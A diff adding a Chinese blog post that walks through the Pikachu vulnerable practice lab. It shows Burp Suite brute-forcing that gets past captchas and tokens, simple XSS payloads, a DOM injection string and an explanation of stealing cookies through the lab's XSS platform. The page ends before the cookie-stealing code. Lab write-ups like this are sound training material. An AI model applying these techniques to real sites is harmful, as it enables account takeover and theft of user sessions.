@@ -1,0 +1,1302 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Pikachu通关之旅 | 52hertzi</title><meta name="keywords" content="渗透,靶场"><meta name="author" content="Shawn"><meta name="copyright" content="Shawn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="前言 Pikachu是一个综合性的练习靶场，我们来看一下它的概述：Pikachu上的漏洞类型列表如下： Burt Force(暴力破解漏洞) XSS(跨站脚本漏洞) CSRF(跨站请求伪造) SQL-Inject(SQL注入漏洞) RCE(远程命令&#x2F;代码执行) Files Inclusion(文件包含漏洞) Unsafe file downloads(不安全的文件下载) Unsafe file u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu通关之旅">
+<meta property="og:url" content="http://52hertzi.com/2020/11/08/Pikachu%E4%B9%8B%E9%80%9A%E5%85%B3%E4%B9%8B%E6%97%85/index.html">
+<meta property="og:site_name" content="52hertzi">
+<meta property="og:description" content="前言 Pikachu是一个综合性的练习靶场，我们来看一下它的概述：Pikachu上的漏洞类型列表如下： Burt Force(暴力破解漏洞) XSS(跨站脚本漏洞) CSRF(跨站请求伪造) SQL-Inject(SQL注入漏洞) RCE(远程命令&#x2F;代码执行) Files Inclusion(文件包含漏洞) Unsafe file downloads(不安全的文件下载) Unsafe file u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/01/23/6NfDvmI2c5VesXP.jpg">
+<meta property="article:published_time" content="2020-11-08T05:33:05.000Z">
+<meta property="article:modified_time" content="2021-06-30T14:37:22.725Z">
+<meta property="article:author" content="Shawn">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/01/23/6NfDvmI2c5VesXP.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://52hertzi.com/2020/11/08/Pikachu%E4%B9%8B%E9%80%9A%E5%85%B3%E4%B9%8B%E6%97%85/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Shawn","link":"链接: ","source":"来源: 52hertzi","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-06-30 22:37:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2020/11/09/qgoaAWLQdRIs7uD.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-envira"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2021/01/23/6NfDvmI2c5VesXP.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">52hertzi</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/artitalk/"><i class="fa-fw fa fa-envira"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">Pikachu通关之旅</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-08T05:33:05.000Z" title="发表于 2020-11-08 13:33:05">2020-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-06-30T14:37:22.725Z" title="更新于 2021-06-30 22:37:22">2021-06-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
+<li><p>Pikachu是一个综合性的练习靶场，我们来看一下它的概述：<br>Pikachu上的漏洞类型列表如下：<br> Burt Force(暴力破解漏洞)<br> XSS(跨站脚本漏洞)<br> CSRF(跨站请求伪造)<br> SQL-Inject(SQL注入漏洞)<br> RCE(远程命令/代码执行)<br> Files Inclusion(文件包含漏洞)<br> Unsafe file downloads(不安全的文件下载)<br> Unsafe file uploads(不安全的文件上传)<br> Over Permisson(越权漏洞)<br> ../../../(目录遍历)<br> I can see your ABC(敏感信息泄露)<br> PHP反序列化漏洞<br> XXE(XML External Entity attack)<br> 不安全的URL重定向<br> SSRF(Server-Side Request Forgery)<br> More…(找找看?..有彩蛋!)<br> 管理工具里面提供了一个简易的xss管理后台,供你测试钓鱼和捞cookie~<br> 后续会持续更新一些新的漏洞进来,也欢迎你提交漏洞案例给我,最新版本请关注pikachu</p>
+<blockquote>
+<p>每类漏洞根据不同的情况又分别设计了不同的子类<br>同时,为了让这些漏洞变的有意思一些,在Pikachu平台上为每个漏洞都设计了一些小的场景,点击漏洞页面右上角的”提示”可以查看到帮助信息。</p>
+<h3 id="切记"><a href="#切记" class="headerlink" title="切记"></a>切记</h3><p>   “少就是多,慢就是快” </p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu"><strong>Github地址</strong></a></p>
+</li>
+<li><p>接下来我们开始我们的通关之旅</p>
+</li>
+</ul>
+<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><ul>
+<li><h2 id="概述（Burte-Force）"><a href="#概述（Burte-Force）" class="headerlink" title="概述（Burte Force）"></a>概述（Burte Force）</h2></li>
+<li><p>暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。 </p>
+</li>
+<li><p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
+<p> ​    1.是否要求用户设置复杂的密码；<br> ​    2.是否每次认证都使用安全的验证码<br> ​    3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br> ​    4.是否采用了双因素认证；<br> ​    等等。。。。。。<br> 千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!</p>
+</li>
+</ul>
+<ul>
+<li><p>一个有效的字典，可以大大的提高暴力破解的效率</p>
+<ul>
+<li><p>常用的账号密码（弱口令），比如常用用户名/密码 TOP500等。</p>
+</li>
+<li><p>互联网上被脱裤后的账号密码（社工库），比如当年CSDN泄露的600w用户信息。</p>
+</li>
+<li><p>使用指定的字符使用工具按照指定的规则进行排列组合算法生成的密码。</p>
+<p><strong><em>从来没有哪个时代的黑客像今天一样热衷于猜解密码 —奥斯特洛夫斯基</em></strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2></li>
+</ul>
+<p><img src="https://i.loli.net/2020/11/09/ysdFWAt3eh4plmM.png"></p>
+<blockquote>
+<p>首先我们来看这个登陆界面，很常见吧！打开Burpsuit设置好代理然后爆破一波弱口令！账号我们选择admin进行爆破</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/eYi9K7RjOdaBUcb.png"></p>
+<blockquote>
+<p>这是我抓到的数据包，全选然后快捷键Ctrl+i转到爆破（Intruder）模块</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/PFuhY6azvEXNI9w.png"></p>
+<blockquote>
+<p>点击右侧的Clear，将默认选中全部清空，然后选中数据包中包含密码的部分点击右侧Add，第三步开始设置payload</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/wAJDp6bNoRan7Q8.png"></p>
+<blockquote>
+<p>找到Payload设置，点击load选择字典，然后Start Attack</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/TM2uLXntypIjxw9.png"></p>
+<blockquote>
+<p>结束后点击Length，让返回的数据包的长度进行降序，这里我们看到当Payload为123456的时候返回的数据包的长度为34997，其他均为35021。查看返回数据，发现成功登陆成功。</p>
+</blockquote>
+<ul>
+<li><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2></li>
+</ul>
+<blockquote>
+<p>这里我们来到暴力破解关于服务端验证码的绕过</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/FpaDZIYbBeSQxHw.png"></p>
+<blockquote>
+<p>话不多说，直接抓包来看一下</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/ABrnIFXZRwVuakW.png"></p>
+<blockquote>
+<p>这里很清晰的看到账号密码验证码都是以明文传输的，Ctrl+p到重放模块，Go一下</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/7GSE6nXOqpgv5Du.png"></p>
+<blockquote>
+<p>这里显示没有登陆成功，意料之中。我们再次Go一下，看看会不会爆验证码的错误呢！</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/a84YAk7IqCDeOfu.png"></p>
+<blockquote>
+<p>并没有爆验证码的错误，那么只要不刷新页面，那么这个验证码就可以无限重复的使用。（上面两张图不是同一张哦）</p>
+<p>全选我们的数据包到Intrude爆破模块进行密码猜解</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/Ph32g4HTSZvtlYV.png"></p>
+<blockquote>
+<p>Clear清除所有默认选中，将密码选中添加Add，然后设置payload，加载字典后开始爆破</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/bg3z6wT5utGNmdQ.png"></p>
+<blockquote>
+<p>将数据包的字节长度进行降序，这里当payload为123456，长度不同与其他payload的长度。查看返回数据包，成功爆破！</p>
+</blockquote>
+<ul>
+<li><h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2></li>
+</ul>
+<blockquote>
+<p>这里我们来看验证码的绕过，不过这个是基于客户端的绕过</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/FpaDZIYbBeSQxHw.png"></p>
+<blockquote>
+<p>我们抓包分析一波</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/ABrnIFXZRwVuakW.png"></p>
+<blockquote>
+<p>所有数据都很明了，全选Ctrl+R到重放模块，Go分析一下</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/GrKpuWBDoUyLj4P.png"></p>
+<blockquote>
+<p>这里直接把JS代码显示出来了，简单看一下可以确定为生成验证码的JS，直接爆破试一下。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/PIZk54vhGgOLVNH.png"></p>
+<blockquote>
+<p>验证码可以重复使用emmmmmm，成功的爆破出来</p>
+<p>既然是前端JS型的验证码，那么我们直接移除JS，看看是否也可以成功绕过</p>
+<p>在代理Proxy模块的设置中，Response Modification中勾选Remove all Javascript选项，将所有JS移除</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/5NYQ7CsiXJn3dwD.png"></p>
+<blockquote>
+<p>然后刷新页面</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/1lpTkFsyIf4K62N.png"></p>
+<blockquote>
+<p>这里我们看到验证码直接没有了，我们抓一下包放到爆破模块进行爆破</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/09/reUDq3Y5dWaLPlf.png"></p>
+<blockquote>
+<p>成功爆破</p>
+</blockquote>
+<ul>
+<li><h2 id="token验证"><a href="#token验证" class="headerlink" title="token验证"></a>token验证</h2></li>
+</ul>
+<blockquote>
+<p>Token介绍</p>
+<p>1、当前端向服务端请求认证并成功后，服务端将会返回一个Token值给前端作为合法身份的令牌。</p>
+<p>2、Token可以避免CSRF攻击</p>
+</blockquote>
+<p>接下来我们步入正题来看暴力破解之Token验证</p>
+<p><img src="https://i.loli.net/2020/11/10/1hNr5kifMy4FtG6.png"></p>
+<blockquote>
+<p>我们先用Bp抓个包来看一下</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/kqPI7xniSYy3rOc.png"></p>
+<blockquote>
+<p>这里看到token是个很长的一段加密的值，放到Repeater模块重放分析看一下</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/biOp3lhF2fHm7DS.png"></p>
+<p>*** 分析返回的数据包，发现有一个隐藏的标签，里面记录了服务端返回的token值，并且和我们抓到的数据的包的token值不一样，那么是不是我们每请求一次服务端，服务端就会返回一个不同的token值来验证我们的身份。**</p>
+<blockquote>
+<p>为了验证这个想法，我们把包放掉重新请求一下服务端，并再次查看前端的源码</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/kPpQhvXLIYc8A4b.png"></p>
+<blockquote>
+<p>这下基本可以确定之前的想法是正确的，那么接下来该怎么办！</p>
+<p>这时候神器BP该登场了QWQ</p>
+<p>抓个包放到爆破模块，选中密码以及token值，并将攻击类型（Attack type）修改为Pitchfork</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/HqVwGN2gU7sRmOo.png"></p>
+<blockquote>
+<p>然后进入到payload模块添加字典</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/H6r5CLOl8WnRKMT.png"></p>
+<blockquote>
+<p>下面在Payload sets中选择2，然后将payload type选为Recursive grep</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/9datFrkvVWq74h1.png"></p>
+<blockquote>
+<p>然后在Option设置中找到Grep-Extract模块</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/OEH5JacYqyvTZbU.png"></p>
+<blockquote>
+<p>点击Add添加，然后在弹窗里先点击Refetch response刷新，下面找到数据包中的token值选中并复制（后边会用到），点击OK</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/A95Xskg3hJ1aDNo.png"></p>
+<blockquote>
+<p>接下来我们回到Payload模块设置，在第二个payload处将刚刚复制的token值粘贴到Initial payload for this request方框处</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/PV2kKJQ7BeNWGYS.png"></p>
+<blockquote>
+<p>然后划到页面的最下方有个Rediredtion模块，将Follow redirections选项选为Always</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/iPZ5MhSNojspeOC.png"></p>
+<blockquote>
+<p>再转到Option设置中将线程（Number of threads）改为1</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/fOs5wZ8FTVd31QS.png"></p>
+<blockquote>
+<p>最后开始攻击（Start attack）</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/10/DPA4r3FucsaTQUx.png"></p>
+<blockquote>
+<p>成功爆破</p>
+</blockquote>
+<blockquote>
+<p>Token验证爆破原理：</p>
+<p>当我们抓包放到BP爆破模块中时，服务端已经给了我们一个新的Token值，那么我们需要将这个获取到的Token值给到我们下一个爆破的密码作为身份令牌。</p>
+</blockquote>
+<ul>
+<li><p>暴力破解小结</p>
+<p>1、暴力破解依旧为当今最大漏洞且常用渗透手法之一，它的危害可想而知，只要你的字典足够的强大，那么剩下的只是时间的问题。</p>
+<p>2、暴力破解的应用场景有很多，但是往往很多防御的都不是很严格。</p>
+<p>3、这登陆场景下我们除了设置Token等令牌验证还应该设置限制错误登陆次数或者错误登陆的时间间隔。</p>
+</li>
+</ul>
+<h1 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h1><ul>
+<li><h2 id="跨站脚本漏洞概述"><a href="#跨站脚本漏洞概述" class="headerlink" title="跨站脚本漏洞概述"></a>跨站脚本漏洞概述</h2><ul>
+<li>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</li>
+<li>XSS是一种发生在web前端的漏洞，所以其危害的对象也主要是前端用户</li>
+<li>XSS漏洞可以用来进行钓鱼攻击、前端JS挖矿、用户cookie获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制等。</li>
+</ul>
+</li>
+<li><h2 id="跨站脚本漏洞类型"><a href="#跨站脚本漏洞类型" class="headerlink" title="跨站脚本漏洞类型"></a>跨站脚本漏洞类型</h2><ul>
+<li><p><strong>反射型</strong></p>
+<p>交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面。</p>
+</li>
+<li><p><strong>存储型</strong></p>
+<p>交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面。</p>
+</li>
+<li><p><strong>DOM型</strong></p>
+<p>不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性也属于反射性。</p>
+</li>
+</ul>
+</li>
+<li><h2 id="XSS形成的原因及测试基本流程"><a href="#XSS形成的原因及测试基本流程" class="headerlink" title="XSS形成的原因及测试基本流程"></a>XSS形成的原因及测试基本流程</h2><ul>
+<li><p><strong>原因</strong></p>
+<p>形成xss漏洞的主要愿意是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端是被浏览器当作有效代码解析执行从而产生危害。</p>
+</li>
+<li><p><strong>流程</strong></p>
+<p>1、在目标站点上找到输入点，比如查询接口，留言板等；</p>
+<p>2、输入一组“特殊字符+唯一识别字符”，点击提交后，产看返回的源码，是否又做对应的处理；</p>
+<p>3、通过搜索定位到位置字符，结合唯一字符前后语法确认是否可以构造执行JS条件（构造闭合）；</p>
+<p>4、提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞；</p>
+<p>​    <strong>Tips：</strong></p>
+<p>​        1、一般查询接口容易出现反射型xss，留言板容易出现存储型xss</p>
+<p>​        2、由于后台可能存在过滤措施，构造的script可能会被过滤掉，而无法生效或者环境限制了执行（浏览器）；</p>
+<p>​        3、通过变化不同的js，尝试绕过后台过滤机制；</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><h2 id="反射型XSS（Get）"><a href="#反射型XSS（Get）" class="headerlink" title="反射型XSS（Get）"></a>反射型XSS（Get）</h2></li>
+</ul>
+<blockquote>
+<p>Get方式的xss漏洞更加容易利用，一般利用的方式是将带有跨站脚本的URL伪装后发送给目标</p>
+</blockquote>
+<blockquote>
+<p>下面我们来看一下怎么操作</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/16/Rc3gxSDFCmLOGNv.png"></p>
+<blockquote>
+<p>这里只给了一个提交框。在里面填上js</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    alert(<span class="string">&quot;/xss/&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是这里遇到了一个小问题–&gt;</p>
+<p><img src="https://i.loli.net/2020/11/16/KsEpJICxdqFhkPQ.png"></p>
+<p>这里好像是前端限制了输入长度，导致我们无法输入。F12定位到输入框，将maxlength属性改的大一些。</p>
+<p><img src="https://i.loli.net/2020/11/16/Zyo4wcvf8HuhPJ2.png"></p>
+<blockquote>
+<p>接下来在输入框内输入js语句。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/16/p5K3eBf7kjPsULy.png"></p>
+<blockquote>
+<p>点击submit</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/16/4Afc7pTVuIgEY3y.png"></p>
+<blockquote>
+<p>成功弹窗！</p>
+</blockquote>
+<ul>
+<li><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><blockquote>
+<p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞.</p>
+<p>详情请至<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/">W3school</a>学习</p>
+</blockquote>
+<p>先在输入框中随意输入一点东西看看，这里输入123尝试，然后F12查看源码</p>
+<p><img src="https://i.loli.net/2020/11/23/l8BgSJk27EqDxTf.png"></p>
+<p>开始构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&quot; onlick&#x3D;(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/11/23/VdzBvU3qmYtHbFX.png"></p>
+<p>F12查看源码</p>
+<p><img src="https://i.loli.net/2020/11/23/fkT4U3tFIEbGRsq.png"></p>
+<p>成功插入</p>
+</li>
+<li><h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2></li>
+</ul>
+<p>这里和之前的操作一致，只是多了步点击的操作</p>
+<blockquote>
+<p>直接构造payload</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/11/23/HkC9YnfUhzlWKgb.png"></p>
+<p>查看源码</p>
+<p><img src="https://i.loli.net/2020/11/23/M75xgraBNifD1Kq.png"></p>
+<p>成功写入</p>
+<ul>
+<li><h2 id="反射型XSS利用（Get型获取Cookie）"><a href="#反射型XSS利用（Get型获取Cookie）" class="headerlink" title="反射型XSS利用（Get型获取Cookie）"></a>反射型XSS利用（Get型获取Cookie）</h2><blockquote>
+<h3 id="钓鱼原理："><a href="#钓鱼原理：" class="headerlink" title="钓鱼原理："></a>钓鱼原理：</h3><p>​    1、用户访问带有xss页面</p>
+<p>​    2、服务器返回带有恶意js的页面</p>
+<p>​    3、用户客户端执行js脚本，发送窃取数据（cookie）至攻击者后台</p>
+<p>​    4、伪造用户登陆</p>
+</blockquote>
+<p>下面开始演示：</p>
+<p>在pikachu靶场中内置了一个简易的xss平台</p>
+<p><img src="https://i.loli.net/2020/11/18/kfyH6i5eNA3UmzZ.png"></p>
+<blockquote>
+<p>登陆账号密码为admin/123456</p>
+</blockquote>
+<p>进入Cookie搜集模块</p>
+<p><img src="https://i.loli.net/2020/11/18/Xrcd76nukthjb9G.png"></p>
+<p>暂时还没有数据，回到首页</p>
+<p><img src="https://i.loli.net/2020/11/18/XaIkbGKMqljfSLH.png"></p>
+<p>在这里插入我们的恶意代码</p>
